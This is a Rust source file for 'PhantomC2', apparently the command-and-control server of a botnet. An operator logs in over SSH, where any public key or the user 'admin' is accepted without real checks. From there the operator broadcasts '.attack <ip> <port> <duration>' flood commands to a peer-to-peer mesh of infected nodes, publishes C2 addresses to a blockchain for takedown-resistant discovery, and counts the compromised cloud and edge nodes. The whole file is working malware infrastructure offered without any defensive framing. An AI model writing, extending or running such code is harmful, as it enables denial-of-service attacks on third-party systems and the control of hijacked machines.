use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::path::PathBuf;
use async_trait::async_trait;
use russh::{server, Channel, ChannelId, CryptoVec};
use russh_keys::key;
use log::info;
use crate::network::P2PService;

// Shared State for the C2
pub struct ServerState {
    pub clients: HashMap<ChannelId, usize>, // Just tracking IDs for now
}

#[derive(Clone)]
pub struct PhantomServer {
    pub state: Arc<Mutex<ServerState>>,
    pub master_key: Arc<ed25519_dalek::SigningKey>,
    pub p2p_service: Arc<P2PService>,
    pub keys_dir: PathBuf,
}

impl PhantomServer {
    pub fn new(master_key: Arc<ed25519_dalek::SigningKey>, p2p_service: Arc<P2PService>, keys_dir: PathBuf) -> Self {
        Self {
            state: Arc::new(Mutex::new(ServerState { clients: HashMap::new() })),
            master_key,
            p2p_service,
            keys_dir,
        }
    }
}

pub struct PhantomSession {
    pub state: Arc<Mutex<ServerState>>,
    pub master_key: Arc<ed25519_dalek::SigningKey>,
    pub p2p_service: Arc<P2PService>,
    pub keys_dir: PathBuf,
}

#[async_trait]
impl server::Handler for PhantomSession {
    type Error = anyhow::Error;

    async fn channel_open_session(
        self,
        _channel: Channel<server::Msg>,
        session: server::Session,
    ) -> Result<(Self, bool, server::Session), Self::Error> {
        info!("SSH Session Opened!");
        Ok((self, true, session))
    }

    async fn auth_publickey(
        self,
        user: &str,
        _public_key: &key::PublicKey,
    ) -> Result<(Self, server::Auth), Self::Error> {
        info!("Auth Public Key: {}", user);
        Ok((self, server::Auth::Accept))
    }

    async fn auth_password(
        self,
        user: &str,
        _password: &str,
    ) -> Result<(Self, server::Auth), Self::Error> {
        info!("Auth Password: {}", user);
         if user == "admin" {
             Ok((self, server::Auth::Accept))
         } else {
             Ok((self, server::Auth::Reject { proceed_with_methods: None }))
         }
    }

    async fn data(
        self,
        channel: ChannelId,
        data: &[u8],
        mut session: server::Session,
    ) -> Result<(Self, server::Session), Self::Error> {
        let text = String::from_utf8_lossy(data);
        let cmd = text.trim();
        
        if !cmd.is_empty() {
             info!("C2 Command: {}", cmd);
             let response = format!("PhantomC2> Received: {}\r\n", cmd);
             session.data(channel, CryptoVec::from_slice(response.as_bytes()));
             
             if cmd == "help" {
                session.data(channel, CryptoVec::from_slice(b"Available:\r\n"));
                session.data(channel, CryptoVec::from_slice(b"  .attack <ip> <port> <duration>  - Broadcast attack to mesh\r\n"));
                session.data(channel, CryptoVec::from_slice(b"  .onchain <ip:port>[,ip:port]... - Publish C2 addresses to blockchain\r\n"));
                session.data(channel, CryptoVec::from_slice(b"  .count                          - Count all nodes in mesh\r\n"));
                session.data(channel, CryptoVec::from_slice(b"  .peers                          - List direct P2P peers\r\n"));
             } else if cmd.starts_with(".attack ") {
                let parts: Vec<&str> = cmd.split_whitespace().collect();
                if parts.len() >= 4 {
                    let target_ip: std::net::Ipv4Addr = parts[1].parse().unwrap_or(std::net::Ipv4Addr::new(0,0,0,0));
                    let port: u16 = parts[2].parse().unwrap_or(0);
                    let duration: u32 = parts[3].parse().unwrap_or(0);
                    
                    let mut payload = Vec::new();
                    payload.push(1); // Attack Type
                    payload.extend_from_slice(&u32::from(target_ip).to_be_bytes());
                    payload.extend_from_slice(&port.to_be_bytes());
                    payload.extend_from_slice(&duration.to_be_bytes());
                    
                    self.p2p_service.broadcast_command(payload).await;
                    
                    session.data(channel, CryptoVec::from_slice(b"[+] Attack broadcasted to mesh\r\n"));
                    info!("Broadcasting Attack on {}", target_ip);
                } else {
                    session.data(channel, CryptoVec::from_slice(b"Usage: .attack <ip> <port> <duration>\r\n"));
                }
             } else if cmd.starts_with(".onchain ") {
                // Parse: .onchain 1.2.3.4:31337,5.6.7.8:31337
                let addr_str = cmd.strip_prefix(".onchain ").unwrap_or("").trim();
                let addresses: Vec<&str> = addr_str.split(',')
                    .map(|s| s.trim())
                    .filter(|s| !s.is_empty())
                    .collect();
                
                if addresses.is_empty() {
                    session.data(channel, CryptoVec::from_slice(b"Usage: .onchain <ip:port>[,ip:port]...\r\n"));
                } else {
                    session.data(channel, CryptoVec::from_slice(
                        format!("[*] Publishing {} address(es) to Sepolia...\r\n", addresses.len()).as_bytes()
                    ));
                    
                    let eth_key_path = self.keys_dir.join("eth.key");
                    let mut eth_key = std::fs::read_to_string(&eth_key_path)
                        .unwrap_or_default()
                        .trim()
                        .to_string();
                    
                    if !eth_key.starts_with("0x") && !eth_key.is_empty() {
                        eth_key = format!("0x{}", eth_key);
                    }
                    
                    if eth_key.is_empty() || eth_key == "0x" {
                        session.data(channel, CryptoVec::from_slice(b"[-] ETH_KEY not configured! Set keys/eth.key\r\n"));
                    } else {
                        // Join addresses with semicolon for payload
                        let payload = addresses.join(";").into_bytes();
                        match crate::network::broadcast_signal(&eth_key, payload).await {
                            Ok(tx_hash) => {
                                session.data(channel, CryptoVec::from_slice(
                                    format!("[+] Onchain published! {}\r\n", tx_hash).as_bytes()
                                ));
                            }
                            Err(e) => {
                                session.data(channel, CryptoVec::from_slice(
                                    format!("[-] Onchain failed: {}\r\n", e).as_bytes()
                                ));
                            }
                        }
                    }
                }
             } else if cmd == ".peers" {
                let count = self.p2p_service.get_peer_count();
                session.data(channel, CryptoVec::from_slice(
                    format!("[*] Direct P2P peers: {}\r\n", count).as_bytes()
                ));
             } else if cmd == ".count" {
                session.data(channel, CryptoVec::from_slice(b"[*] Counting nodes in mesh (5s timeout)...\r\n"));
                let (cloud_nodes, edge_clients) = self.p2p_service.request_count(5).await;
                session.data(channel, CryptoVec::from_slice(
                    format!("Cloud Nodes: {}\r\n", cloud_nodes).as_bytes()
                ));
                session.data(channel, CryptoVec::from_slice(
                    format!("Edge Clients: {} (reported by Clouds)\r\n", edge_clients).as_bytes()
                ));
                session.data(channel, CryptoVec::from_slice(
                    format!("Total: {} nodes\r\n", cloud_nodes as u32 + edge_clients).as_bytes()
                ));
             }
             
             session.data(channel, CryptoVec::from_slice(b"PhantomC2$ "));
        }
        
        Ok((self, session))
    }
}
